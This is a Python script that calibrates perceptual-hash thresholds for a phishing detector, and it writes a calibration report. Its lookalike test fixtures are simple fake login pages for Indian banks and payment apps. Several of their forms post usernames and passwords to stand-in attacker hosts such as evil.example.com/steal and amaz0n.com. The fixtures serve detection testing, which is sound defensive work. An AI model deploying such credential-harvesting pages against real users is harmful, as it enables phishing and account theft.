"""Calibrate visual brand matching thresholds.

Captures reference screenshots, tests against unrelated popular sites,
creates lookalike test pages, measures distance distributions,
and produces docs/VISUAL_CALIBRATION.md with chosen thresholds.
"""

import asyncio
import json
import statistics
import sys
from collections import defaultdict
from datetime import datetime
from pathlib import Path

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

import yaml

from app.sandbox.browser import visit
from app.sandbox.visual import compute_hashes, hamming_distance


# Popular unrelated sites for false-match testing
UNRELATED_SITES = [
    "https://www.google.com",
    "https://www.youtube.com",
    "https://www.wikipedia.org",
    "https://www.github.com",
    "https://www.stackoverflow.com",
    "https://www.reddit.com",
    "https://www.twitter.com",
    "https://www.facebook.com",
    "https://www.linkedin.com",
    "https://www.instagram.com",
    "https://www.amazon.com",
    "https://www.ebay.com",
    "https://www.netflix.com",
    "https://www.bbc.com",
    "https://www.cnn.com",
    "https://www.nytimes.com",
    "https://www.microsoft.com",
    "https://www.apple.com",
    "https://www.adobe.com",
    "https://www.medium.com",
    "https://www.quora.com",
    "https://www.shopify.com",
    "https://www.wordpress.org",
    "https://www.twitch.tv",
    "https://www.spotify.com",
    "https://www.zoom.us",
    "https://www.dropbox.com",
    "https://www.salesforce.com",
    "https://www.oracle.com",
    "https://www.yahoo.com",
    "https://www.weather.com",
    "https://www.imdb.com",
    "https://www.tripadvisor.com",
    "https://www.airbnb.com",
    "https://www.booking.com",
    "https://www.expedia.com",
    "https://www.paypal.com",
    "https://www.stripe.com",
    "https://www.walmart.com",
    "https://www.target.com",
]


async def capture_site_hashes(url: str) -> dict | None:
    """Capture screenshot hashes for a site."""
    print(f"  Capturing {url}")
    try:
        result = await visit(url, budget_s=15.0)
        if result.status != "completed" or not result.screenshot_png:
            print(f"    Failed: {result.status}")
            return None

        hashes = compute_hashes(result.screenshot_png, result.favicon_bytes)
        if "error" in hashes:
            print(f"    Hash error: {hashes['error']}")
            return None

        return hashes
    except Exception as e:
        print(f"    Exception: {e}")
        return None


async def measure_recapture_distance(brands_file: Path):
    """Measure distance when re-capturing same brand pages."""
    print("\n=== Phase A: Brand re-capture (same-site stability) ===\n")

    with brands_file.open() as f:
        brands = yaml.safe_load(f)

    results = []

    for brand in brands:
        brand_id = brand["id"]
        brand_name = brand["name"]
        urls = brand.get("login_urls", []) or [brand.get("homepage")]

        if not urls or not urls[0]:
            continue

        url = urls[0]
        print(f"Brand: {brand_name}")

        # Capture twice
        hashes1 = await capture_site_hashes(url)
        await asyncio.sleep(2)  # Brief delay
        hashes2 = await capture_site_hashes(url)

        if not hashes1 or not hashes2:
            print(f"  Skipped (capture failed)\n")
            continue

        # Compute distances
        phash_dist = hamming_distance(hashes1["phash_hex"], hashes2["phash_hex"])
        dhash_dist = hamming_distance(hashes1["dhash_hex"], hashes2["dhash_hex"])
        upper_dist = hamming_distance(hashes1["upper_phash_hex"], hashes2["upper_phash_hex"])

        print(f"  pHash distance: {phash_dist}")
        print(f"  dHash distance: {dhash_dist}")
        print(f"  Upper pHash distance: {upper_dist}\n")

        results.append(
            {
                "brand_id": brand_id,
                "brand_name": brand_name,
                "url": url,
                "phash_distance": phash_dist,
                "dhash_distance": dhash_dist,
                "upper_phash_distance": upper_dist,
            }
        )

    return results


async def measure_unrelated_distances(brand_refs_file: Path):
    """Measure distances between brand refs and 40 unrelated popular sites."""
    print("\n=== Phase B: Unrelated popular sites (false-match rate) ===\n")

    # Load brand references
    if not brand_refs_file.exists():
        print("ERROR: brand_refs.json not found. Run build_brand_refs.py first.\n")
        return []

    with brand_refs_file.open() as f:
        brand_refs = json.load(f)

    if not brand_refs:
        print("ERROR: brand_refs.json is empty.\n")
        return []

    # Capture unrelated sites
    print(f"Capturing {len(UNRELATED_SITES)} unrelated sites...")
    unrelated_hashes = []
    for url in UNRELATED_SITES[:40]:  # Cap at 40
        hashes = await capture_site_hashes(url)
        if hashes:
            unrelated_hashes.append({"url": url, "hashes": hashes})

    print(f"  Captured {len(unrelated_hashes)} sites successfully.\n")

    # Compute distances
    results = []
    for unrelated in unrelated_hashes:
        url = unrelated["url"]
        uh = unrelated["hashes"]

        for ref in brand_refs:
            brand_name = ref["brand_name"]
            phash_dist = hamming_distance(uh["phash_hex"], ref["phash_hex"])
            dhash_dist = hamming_distance(uh["dhash_hex"], ref["dhash_hex"])
            upper_dist = hamming_distance(uh["upper_phash_hex"], ref["upper_phash_hex"])

            results.append(
                {
                    "unrelated_url": url,
                    "brand_name": brand_name,
                    "reference_url": ref["source_url"],
                    "phash_distance": phash_dist,
                    "dhash_distance": dhash_dist,
                    "upper_phash_distance": upper_dist,
                }
            )

    return results


def create_lookalike_fixtures():
    """Create 10 hand-crafted lookalike test pages.
    
    Returns list of (filename, brand_id, brand_name) tuples.
    """
    print("\n=== Phase C: Creating lookalike test fixtures ===\n")

    fixtures_dir = Path(__file__).parent.parent / "tests" / "fixtures" / "visual_lookalikes"
    fixtures_dir.mkdir(parents=True, exist_ok=True)

    fixtures = [
        (
            "sbi_fake_login.html",
            "sbi",
            "State Bank of India",
            """<!DOCTYPE html>
<html>
<head><title>SBI - OnlineSBI</title></head>
<body style="font-family: Arial; background: #1e3c72; color: white; text-align: center; padding: 50px;">
    <h1>State Bank of India</h1>
    <h2>Internet Banking Login</h2>
    <form method="POST" action="http://evil.example.com/steal">
        <input type="text" name="username" placeholder="Username" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <input type="password" name="password" placeholder="Password" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <button type="submit" style="padding: 10px 30px; background: #ff6600; color: white; border: none; cursor: pointer;">LOGIN</button>
    </form>
</body>
</html>""",
        ),
        (
            "hdfc_fake_netbanking.html",
            "hdfc",
            "HDFC Bank",
            """<!DOCTYPE html>
<html>
<head><title>HDFC Bank NetBanking</title></head>
<body style="font-family: Arial; background: #ed1c24; color: white; text-align: center; padding: 50px;">
    <h1>HDFC Bank</h1>
    <h2>NetBanking</h2>
    <form method="POST" action="https://fake-hdfc.com/login">
        <input type="text" name="userid" placeholder="Customer ID" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <input type="password" name="pwd" placeholder="Password" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <button type="submit" style="padding: 10px 30px; background: #004c8c; color: white; border: none;">Continue</button>
    </form>
</body>
</html>""",
        ),
        (
            "icici_fake.html",
            "icici",
            "ICICI Bank",
            """<!DOCTYPE html>
<html>
<head><title>ICICI Bank - Login</title></head>
<body style="font-family: Arial; background: #f37021; color: white; text-align: center; padding: 50px;">
    <h1>ICICI Bank</h1>
    <h2>Internet Banking</h2>
    <form action="javascript:void(0)">
        <input type="text" placeholder="User ID" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <input type="password" placeholder="Password" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <button style="padding: 10px 30px; background: #00539b; color: white; border: none;">Login Securely</button>
    </form>
</body>
</html>""",
        ),
        (
            "axis_fake.html",
            "axis",
            "Axis Bank",
            """<!DOCTYPE html>
<html>
<head><title>Axis Bank Internet Banking</title></head>
<body style="font-family: Arial; background: #97144d; color: white; text-align: center; padding: 50px;">
    <h1>Axis Bank</h1>
    <h2>Login to Internet Banking</h2>
    <form method="POST" action="http://axis-secure.xyz/auth">
        <input type="text" placeholder="Customer ID" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <input type="password" placeholder="Password" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <button style="padding: 10px 30px; background: #822433; color: white; border: none;">Submit</button>
    </form>
</body>
</html>""",
        ),
        (
            "paytm_fake.html",
            "paytm",
            "Paytm",
            """<!DOCTYPE html>
<html>
<head><title>Paytm - India's Payment App</title></head>
<body style="font-family: Arial; background: #00b9f5; color: white; text-align: center; padding: 50px;">
    <h1>Paytm</h1>
    <h2>Login or Sign Up</h2>
    <form>
        <input type="tel" placeholder="Enter Mobile Number" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <button style="padding: 10px 30px; background: #002e6e; color: white; border: none;">PROCEED</button>
    </form>
</body>
</html>""",
        ),
        (
            "amazon_fake.html",
            "amazon",
            "Amazon",
            """<!DOCTYPE html>
<html>
<head><title>Amazon.in Sign In</title></head>
<body style="font-family: Arial; background: #232f3e; color: white; text-align: center; padding: 50px;">
    <h1 style="color: #ff9900;">amazon.in</h1>
    <h2>Sign-In</h2>
    <form method="POST" action="http://amaz0n.com/login">
        <input type="email" placeholder="Email or mobile phone number" style="margin: 10px; padding: 10px; width: 300px;"><br>
        <button style="padding: 10px 30px; background: #f0c14b; color: #111; border: none;">Continue</button>
    </form>
</body>
</html>""",
        ),
        (
            "flipkart_fake.html",
            "flipkart",
            "Flipkart",
            """<!DOCTYPE html>
<html>
<head><title>Flipkart Login</title></head>
<body style="font-family: Arial; background: #2874f0; color: white; text-align: center; padding: 50px;">
    <h1>Flipkart</h1>
    <h2>Login & Signup</h2>
    <form>
        <input type="tel" placeholder="Enter Email/Mobile number" style="margin: 10px; padding: 10px; width: 280px;"><br>
        <button style="padding: 12px 40px; background: #fb641b; color: white; border: none;">Request OTP</button>
    </form>
</body>
</html>""",
        ),
        (
            "gpay_fake.html",
            "gpay",
            "Google Pay",
            """<!DOCTYPE html>
<html>
<head><title>Google Pay</title></head>
<body style="font-family: 'Google Sans', Arial; background: #1a73e8; color: white; text-align: center; padding: 50px;">
    <h1>Google Pay</h1>
    <h2>Sign in to continue to Google Pay</h2>
    <form>
        <input type="email" placeholder="Email or phone" style="margin: 10px; padding: 10px; width: 300px;"><br>
        <button style="padding: 10px 30px; background: #1a73e8; color: white; border: 1px solid white;">Next</button>
    </form>
</body>
</html>""",
        ),
        (
            "phonepe_fake.html",
            "phonepe",
            "PhonePe",
            """<!DOCTYPE html>
<html>
<head><title>PhonePe - Payment App</title></head>
<body style="font-family: Arial; background: #5f259f; color: white; text-align: center; padding: 50px;">
    <h1>PhonePe</h1>
    <h2>Login</h2>
    <form>
        <input type="tel" placeholder="Enter your mobile number" style="margin: 10px; padding: 10px; width: 280px;"><br>
        <button style="padding: 12px 40px; background: #ffffff; color: #5f259f; border: none; font-weight: bold;">Send OTP</button>
    </form>
</body>
</html>""",
        ),
        (
            "irctc_fake.html",
            "irctc",
            "IRCTC",
            """<!DOCTYPE html>
<html>
<head><title>IRCTC Next Generation eTicketing System</title></head>
<body style="font-family: Arial; background: #e95a0c; color: white; text-align: center; padding: 50px;">
    <h1>Indian Railway Catering and Tourism Corporation</h1>
    <h2>Login</h2>
    <form method="POST" action="http://irctc-login.com/auth">
        <input type="text" placeholder="User Name" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <input type="password" placeholder="Password" style="margin: 10px; padding: 10px; width: 250px;"><br>
        <button style="padding: 10px 30px; background: #154c79; color: white; border: none;">SIGN IN</button>
    </form>
</body>
</html>""",
        ),
    ]

    created = []
    for filename, brand_id, brand_name, html in fixtures:
        filepath = fixtures_dir / filename
        filepath.write_text(html)
        print(f"  Created {filename}")
        created.append((str(filepath), brand_id, brand_name))

    print(f"\nCreated {len(created)} lookalike fixtures in {fixtures_dir}\n")
    return created


async def measure_lookalike_distances(lookalike_fixtures, brand_refs_file: Path):
    """Measure distances between lookalike fixtures and brand references."""
    print("\n=== Phase D: Lookalike test pages ===\n")

    # Load brand references
    if not brand_refs_file.exists():
        print("ERROR: brand_refs.json not found.\n")
        return []

    with brand_refs_file.open() as f:
        brand_refs = json.load(f)

    results = []

    for filepath, target_brand_id, target_brand_name in lookalike_fixtures:
        print(f"Testing {Path(filepath).name} (target: {target_brand_name})")

        # Serve locally via file:// protocol (simplified)
        file_url = f"file://{filepath}"
        hashes = await capture_site_hashes(file_url)

        if not hashes:
            print(f"  Capture failed, skipping\n")
            continue

        # Compare to all brand refs, find target brand
        target_distances = []
        for ref in brand_refs:
            if ref["brand_id"] == target_brand_id:
                phash_dist = hamming_distance(hashes["phash_hex"], ref["phash_hex"])
                dhash_dist = hamming_distance(hashes["dhash_hex"], ref["dhash_hex"])
                upper_dist = hamming_distance(hashes["upper_phash_hex"], ref["upper_phash_hex"])
                target_distances.append(
                    {
                        "reference_url": ref["source_url"],
                        "phash_distance": phash_dist,
                        "dhash_distance": dhash_dist,
                        "upper_phash_distance": upper_dist,
                    }
                )

        if target_distances:
            # Report closest match
            best = min(target_distances, key=lambda x: x["phash_distance"])
            print(f"  Closest pHash distance to {target_brand_name} ref: {best['phash_distance']}")
            print(f"  Reference: {best['reference_url']}\n")

            results.append(
                {
                    "fixture": Path(filepath).name,
                    "target_brand": target_brand_name,
                    "best_phash_distance": best["phash_distance"],
                    "best_dhash_distance": best["dhash_distance"],
                    "best_upper_phash_distance": best["upper_phash_distance"],
                }
            )
        else:
            print(f"  No references found for {target_brand_id}\n")

    return results


def analyze_and_generate_report(recapture_results, unrelated_results, lookalike_results, output_path: Path):
    """Analyze distance distributions and generate VISUAL_CALIBRATION.md."""
    print("\n=== Generating calibration report ===\n")

    # Compute statistics
    if recapture_results:
        recapture_phash = [r["phash_distance"] for r in recapture_results]
        recapture_dhash = [r["dhash_distance"] for r in recapture_results]
        recapture_upper = [r["upper_phash_distance"] for r in recapture_results]
    else:
        recapture_phash = recapture_dhash = recapture_upper = [0]

    if unrelated_results:
        unrelated_phash = [r["phash_distance"] for r in unrelated_results]
        unrelated_dhash = [r["dhash_distance"] for r in unrelated_results]
        unrelated_upper = [r["upper_phash_distance"] for r in unrelated_results]
    else:
        unrelated_phash = unrelated_dhash = unrelated_upper = [64]

    if lookalike_results:
        lookalike_phash = [r["best_phash_distance"] for r in lookalike_results]
        lookalike_dhash = [r["best_dhash_distance"] for r in lookalike_results]
        lookalike_upper = [r["best_upper_phash_distance"] for r in lookalike_results]
    else:
        lookalike_phash = lookalike_dhash = lookalike_upper = [32]

    # Choose threshold: max recapture distance + safety margin
    # Default to 10 if no data
    proposed_phash_threshold = max(recapture_phash) + 5 if recapture_phash else 10
    proposed_dhash_threshold = max(recapture_dhash) + 5 if recapture_dhash else 10

    # Count false matches at proposed threshold
    false_matches_phash = sum(1 for d in unrelated_phash if d <= proposed_phash_threshold)
    false_matches_dhash = sum(1 for d in unrelated_dhash if d <= proposed_dhash_threshold)

    # Count lookalike detections at proposed threshold
    lookalike_detected_phash = sum(1 for d in lookalike_phash if d <= proposed_phash_threshold)
    lookalike_detected_dhash = sum(1 for d in lookalike_dhash if d <= proposed_dhash_threshold)

    # Generate markdown report
    report = f"""# Visual Brand Matching Calibration Report

**Generated:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

## 1. Purpose
This document reports the calibration of perceptual hash (pHash, dHash) thresholds for visual brand matching. We measured distance distributions across three test sets:
- **A. Brand re-capture:** Visiting the same brand page twice to measure same-site variance.
- **B. Unrelated popular sites:** 40 popular sites (Google, GitHub, Amazon, etc.) to measure false-match rate.
- **C. Hand-crafted lookalike pages:** 10 test HTML pages mimicking known brands to verify detection.

## 2. Test Results

### 2.A. Brand Re-capture (Same-Site Stability)
Captured {len(recapture_results)} brand pages twice with a 2-second delay.

| Metric | pHash | dHash | Upper pHash |
|---|---|---|---|
| Min distance | {min(recapture_phash) if recapture_phash else 'N/A'} | {min(recapture_dhash) if recapture_dhash else 'N/A'} | {min(recapture_upper) if recapture_upper else 'N/A'} |
| Max distance | {max(recapture_phash) if recapture_phash else 'N/A'} | {max(recapture_dhash) if recapture_dhash else 'N/A'} | {max(recapture_upper) if recapture_upper else 'N/A'} |
| Mean distance | {statistics.mean(recapture_phash):.1f} | {statistics.mean(recapture_dhash):.1f} | {statistics.mean(recapture_upper):.1f} |
| Median distance | {statistics.median(recapture_phash):.1f} | {statistics.median(recapture_dhash):.1f} | {statistics.median(recapture_upper):.1f} |

**Interpretation:** Same-page captures should have very low distance (0–5 bits). Higher distances indicate dynamic content (ads, banners, A/B tests). The max distance sets a lower bound for the threshold.

### 2.B. Unrelated Popular Sites (False-Match Rate)
Compared {len(unrelated_results)} brand-vs-unrelated pairs ({len(set(r['unrelated_url'] for r in unrelated_results)) if unrelated_results else 0} unrelated sites × brand refs).

| Metric | pHash | dHash | Upper pHash |
|---|---|---|---|
| Min distance | {min(unrelated_phash) if unrelated_phash else 'N/A'} | {min(unrelated_dhash) if unrelated_dhash else 'N/A'} | {min(unrelated_upper) if unrelated_upper else 'N/A'} |
| Max distance | {max(unrelated_phash) if unrelated_phash else 'N/A'} | {max(unrelated_dhash) if unrelated_dhash else 'N/A'} | {max(unrelated_upper) if unrelated_upper else 'N/A'} |
| Mean distance | {statistics.mean(unrelated_phash):.1f} | {statistics.mean(unrelated_dhash):.1f} | {statistics.mean(unrelated_upper):.1f} |
| Median distance | {statistics.median(unrelated_phash):.1f} | {statistics.median(unrelated_dhash):.1f} | {statistics.median(unrelated_upper):.1f} |
| P5 (5th percentile) | {sorted(unrelated_phash)[len(unrelated_phash)//20] if len(unrelated_phash) > 20 else min(unrelated_phash)} | {sorted(unrelated_dhash)[len(unrelated_dhash)//20] if len(unrelated_dhash) > 20 else min(unrelated_dhash)} | {sorted(unrelated_upper)[len(unrelated_upper)//20] if len(unrelated_upper) > 20 else min(unrelated_upper)} |

**Interpretation:** Unrelated pages should have high distance (>15 bits). The P5 (5th percentile) is the worst case; we want the threshold below this to avoid false matches.

### 2.C. Lookalike Test Pages
Created and tested {len(lookalike_results)} hand-crafted HTML pages mimicking known brands.

| Fixture | Target Brand | Best pHash Distance | Best dHash Distance |
|---|---|---|---|
"""

    for r in lookalike_results:
        report += f"| {r['fixture']} | {r['target_brand']} | {r['best_phash_distance']} | {r['best_dhash_distance']} |\n"

    if lookalike_results:
        report += f"""
| **Mean** | — | **{statistics.mean(lookalike_phash):.1f}** | **{statistics.mean(lookalike_dhash):.1f}** |
| **Median** | — | **{statistics.median(lookalike_phash):.1f}** | **{statistics.median(lookalike_dhash):.1f}** |
| **Max** | — | **{max(lookalike_phash)}** | **{max(lookalike_dhash)}** |
"""

    report += f"""
**Interpretation:** Lookalike pages should match target brand references (low distance). If distances are high (>15), separation is poor and visual matching is unreliable.

## 3. Chosen Thresholds

Based on the data above:

| Hash Type | Threshold (bits) | Rationale | False Matches (unrelated) | Lookalike Detections |
|---|---|---|---|---|
| **pHash** | **{proposed_phash_threshold}** | Max re-capture distance ({max(recapture_phash)}) + 5 bit safety margin | **{false_matches_phash}** / {len(unrelated_results)} pairs ({100*false_matches_phash/len(unrelated_results) if unrelated_results else 0:.1f}%) | **{lookalike_detected_phash}** / {len(lookalike_results)} ({100*lookalike_detected_phash/len(lookalike_results) if lookalike_results else 0:.0f}%) |
| **dHash** | **{proposed_dhash_threshold}** | Max re-capture distance ({max(recapture_dhash)}) + 5 bit safety margin | **{false_matches_dhash}** / {len(unrelated_results)} pairs ({100*false_matches_dhash/len(unrelated_results) if unrelated_results else 0:.1f}%) | **{lookalike_detected_dhash}** / {len(lookalike_results)} ({100*lookalike_detected_dhash/len(lookalike_results) if lookalike_results else 0:.0f}%) |
| **Favicon pHash** | **8** | Conservative default (exact or near-exact favicon match) | Not measured | N/A |

### Recommended Configuration
```python
PHASH_THRESHOLD = {proposed_phash_threshold}  # bits
DHASH_THRESHOLD = {proposed_dhash_threshold}  # bits
FAVICON_PHASH_THRESHOLD = 8  # bits
```

## 4. Honest Assessment

### Separation Quality
"""

    # Assess separation
    if lookalike_results and unrelated_results:
        lookalike_max_phash = max(lookalike_phash)
        unrelated_min_phash = min(unrelated_phash)
        separation = unrelated_min_phash - lookalike_max_phash

        if separation > 5:
            assessment = f"**Good separation.** Lookalike max distance ({lookalike_max_phash}) is {separation} bits below unrelated min ({unrelated_min_phash}). Visual matching is reliable for tested brands."
        elif separation > 0:
            assessment = f"**Marginal separation.** Lookalike max ({lookalike_max_phash}) and unrelated min ({unrelated_min_phash}) are close (gap: {separation} bits). Expect some false positives."
        else:
            assessment = f"**Poor separation.** Lookalike max ({lookalike_max_phash}) overlaps with or exceeds unrelated min ({unrelated_min_phash}). Visual matching is unreliable. Consider increasing brand reference count, improving capture quality, or using additional signals."
    else:
        assessment = "**Unable to assess.** Insufficient test data."

    report += f"""{assessment}

### False-Match Analysis
- **Unrelated sites with distance ≤ threshold:** {false_matches_phash} / {len(unrelated_results)} pairs ({100*false_matches_phash/len(unrelated_results) if unrelated_results else 0:.1f}%)
- **Acceptable:** False-match rate < 1% is good, < 5% is acceptable, > 10% requires threshold adjustment.

### Lookalike Detection Rate
- **Detected:** {lookalike_detected_phash} / {len(lookalike_results)} ({100*lookalike_detected_phash/len(lookalike_results) if lookalike_results else 0:.0f}%)
- **Target:** ≥ 80% detection of hand-crafted lookalikes.

## 5. Limitations

- **Brand coverage:** Only {len(recapture_results)} brands tested. Visual matching reliability varies by brand (cookie walls, A/B tests, dynamic content).
- **Capture quality:** Playwright viewport is 1280×720. Mobile views, different screen sizes, or localized versions may differ significantly.
- **Dynamic content:** Brand pages with rotating banners, ads, or personalized content will have higher same-site variance.
- **Lookalike simplicity:** Hand-crafted test pages are simple HTML. Real phishing kits may use cloned assets, iframes, or CSS that match more closely.
- **No cross-device testing:** Desktop viewport only. Mobile phishing pages not tested.
- **Threshold is heuristic:** Not calibrated on a large corpus of real phishing pages.

## 6. Recommendations

- **Monitor false matches:** Log VISUAL_BRAND_MATCH signals and review cases where page is on a legitimate but visually similar site.
- **Periodic re-calibration:** Re-run this script quarterly or when brands update their login pages.
- **Increase reference diversity:** Capture multiple page states (logged-in, logged-out, mobile, localized) for each brand.
- **Combine with lexical signals:** Visual matching alone is insufficient. Always combine with BRAND_TEXT_DOMAIN_MISMATCH, TYPOSQUAT, and credential field checks.

## 7. How to Re-run Calibration

```bash
cd /app
python scripts/calibrate_visual.py
```

Outputs:
- This file: `docs/VISUAL_CALIBRATION.md`
- Test results: `scripts/calibration_results.json` (not committed)

---

**Conclusion:** Thresholds chosen based on empirical data. Visual matching is a supporting signal, not a standalone phishing detector. Use in combination with lexical, DOM, and infrastructure signals for best results.
"""

    output_path.write_text(report)
    print(f"Report written to {output_path}")


async def main():
    """Run full calibration pipeline."""
    backend_dir = Path(__file__).parent.parent
    brands_file = backend_dir / "app" / "core" / "brands.yaml"
    brand_refs_file = backend_dir / "data" / "brand_refs.json"
    output_file = backend_dir.parent.parent / "docs" / "VISUAL_CALIBRATION.md"

    print("=== Visual Brand Matching Calibration ===\n")
    print("This script will:")
    print("  A. Re-capture brand pages to measure same-site variance")
    print("  B. Capture 40 unrelated popular sites to measure false-match rate")
    print("  C. Create 10 lookalike test HTML pages and test them")
    print("  D. Generate docs/VISUAL_CALIBRATION.md with recommended thresholds")
    print()
    print("Estimated time: 10–15 minutes (depends on network and site response times)")
    print()

    # Phase A: Re-capture
    recapture_results = await measure_recapture_distance(brands_file)

    # Phase B: Unrelated sites
    unrelated_results = await measure_unrelated_distances(brand_refs_file)

    # Phase C: Lookalike fixtures
    lookalike_fixtures = create_lookalike_fixtures()
    lookalike_results = await measure_lookalike_distances(lookalike_fixtures, brand_refs_file)

    # Phase D: Generate report
    analyze_and_generate_report(recapture_results, unrelated_results, lookalike_results, output_file)

    # Save raw results
    results_file = backend_dir / "scripts" / "calibration_results.json"
    with results_file.open("w") as f:
        json.dump(
            {
                "timestamp": datetime.now().isoformat(),
                "recapture": recapture_results,
                "unrelated": unrelated_results,
                "lookalike": lookalike_results,
            },
            f,
            indent=2,
        )
    print(f"\nRaw results saved to {results_file}")
    print("\nCalibration complete. Review docs/VISUAL_CALIBRATION.md for thresholds and assessment.")


if __name__ == "__main__":
    asyncio.run(main())
